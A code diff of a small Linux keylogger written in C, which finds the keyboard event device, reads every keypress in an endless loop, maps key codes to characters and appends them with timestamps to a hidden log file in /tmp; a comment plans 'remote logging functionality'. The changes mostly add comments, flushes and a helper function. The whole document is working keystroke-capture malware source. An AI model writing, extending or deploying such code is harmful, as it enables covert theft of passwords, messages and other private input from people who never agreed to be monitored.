@@ -12,14 +12,26 @@
 #include <sys/stat.h>
 #include <stdlib.h>
 #include <string.h>
-#include <regex.h>
 #include <time.h>
 
 #define LOGFILE "/tmp/data"
 
+// sets the event handler
 char* set_input();
+
+// log loop
 void log_r(const char *driver);
+
+// timestamps the logfile
 void delimit(FILE *fp);
+
+// bundled flushing and printing into a function
+// FIXME: this adds overhead but necessary for a/a+
+void print_safe(FILE *fp, const char *data);
+
+// maps enum variants to codes from the event struct to handle without
+// numbers hardcoded into a switch
+void special_char_check(const int code);
 
 int main(int argc, char **argv) {
 
@@ -28,19 +40,13 @@ int main(int argc, char **argv) {
   // clean up log() by separating log entries by times
   // add remote logging functionality
 
-
   // find the keyboard driver
   char *driver = set_input(driver);
-
 
   // log from character device driver
   if(driver)
     log_r(driver); // separate delimit() function call from here based
   // on time elapsed between log entries */
-  
-
-  
-
 }
 
 char* set_input() {
@@ -56,8 +62,7 @@ char* set_input() {
   const char *s = "keyboard";
   char buf[500]; // tmp
 
-  while( fgets(buf, 500, fptr) ) 
-    {
+  while( fgets(buf, 500, fptr) ) {
     char *ret = strstr(buf, s);
     if(ret) {
 
@@ -65,7 +70,8 @@ char* set_input() {
       for(int i = 0; i < 4; ++i)
 	fgets(buf, 500, fptr);
 
-      // there are many problems here and assumptions made
+      // find the event handler number
+      // FIXME: refactor
       char tmp[20];
       for(int i = 0; i < 500; ++i) {
 	if(buf[i] == 'e' && buf[i+1] == 'v') {
@@ -74,11 +80,8 @@ char* set_input() {
 	  }
 	}
       }
-
-      
       
       strcat(driver, tmp);
-
     }
   }
 
@@ -90,10 +93,12 @@ void log_r(const char *driver) {
   int fd = open(driver, O_RDONLY);
   FILE *fp = fopen(LOGFILE, "a");
 
+  fprintf(fp, "TEST");
+  fflush(fp);
+
   char *map = "..1234567890-=..qwertyuiop[]..asdfghjkl;'`.\\zxcvbnm,./";
 
   while(1) {
-
     time_t before = clock();
     
     read(fd, &ev, sizeof(ev));
@@ -107,9 +112,11 @@ void log_r(const char *driver) {
       
       switch(ev.code) {
       case(0):
+	fflush(fp);
 	fprintf(fp, "KEY_RESERVED");
 	break;
       case(1):
+	fflush(fp);
 	fprintf(fp, "KEY_ESC");
 	break;
       case(14):
@@ -145,9 +152,19 @@ void delimit(FILE *fp) {
   time_t rawtime;
   struct tm * timeinfo;
 
+  // this is required everywhere due to being in append mode
+  fflush(fp);
+
+  // print the time of logging to the file
   time ( &rawtime );
   timeinfo = localtime ( &rawtime );
-  fprintf (fp, "[%s", asctime (timeinfo) );
-  fprintf(fp, "]\n");
+  fprintf (fp, "[%s]", asctime (timeinfo) );
+
+}
+
+void print_safe(FILE *fp, const char *data) {
+
+  fflush(fp);
+  fprintf(fp, "%s", data);
 
 }
